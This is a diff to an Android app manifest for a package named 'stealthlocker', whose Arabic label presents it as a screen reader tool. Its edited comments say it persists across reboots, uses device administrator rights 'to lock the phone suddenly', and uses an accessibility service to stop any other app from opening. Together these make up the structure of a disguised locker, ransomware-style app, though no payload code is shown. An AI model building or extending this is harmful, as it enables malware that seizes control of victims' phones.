@@ -2,6 +2,7 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.example.stealthlocker">
 
+    <!-- الأذونات الأساسية للإقلاع، الإغفاء، والتراكب الأمني -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
@@ -12,7 +13,7 @@
         android:label="أداة قراءة الشاشة"
         android:theme="@style/Theme.AppCompat.NoActionBar">
 
-        <!-- واجهة القفل الحصينة الأساسية -->
+        <!-- واجهة القفل الأساسية (التي تفتح كبداية للتطبيق) -->
         <activity 
             android:name=".PasswordLockActivity" 
             android:exported="true"
@@ -27,7 +28,7 @@
 
         <activity android:name=".MainActivity" android:exported="false" />
 
-        <!-- مستقبل الإقلاع -->
+        <!-- مستقبل إعادة تشغيل الهاتف لضمان بقاء الحماية مستمرة -->
         <receiver 
             android:name=".BootReceiver" 
             android:enabled="true" 
@@ -40,7 +41,7 @@
             </intent-filter>
         </receiver>
 
-        <!-- مستقبل مسؤول الجهاز -->
+        <!-- مستقبل صلاحيات مسؤول الجهاز لقفل الهاتف فجأة -->
         <receiver
             android:name=".MyAdminReceiver"
             android:permission="android.permission.BIND_DEVICE_ADMIN"
@@ -53,7 +54,7 @@
             </intent-filter>
         </receiver>
 
-        <!-- خدمة إمكانية الوصول لمنع فتح أي تطبيق آخر -->
+        <!-- خدمة إمكانية الوصول لحراسة الشاشة ومنع فتح أي تطبيق آخر -->
         <service
             android:name=".MyAccessibilityService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
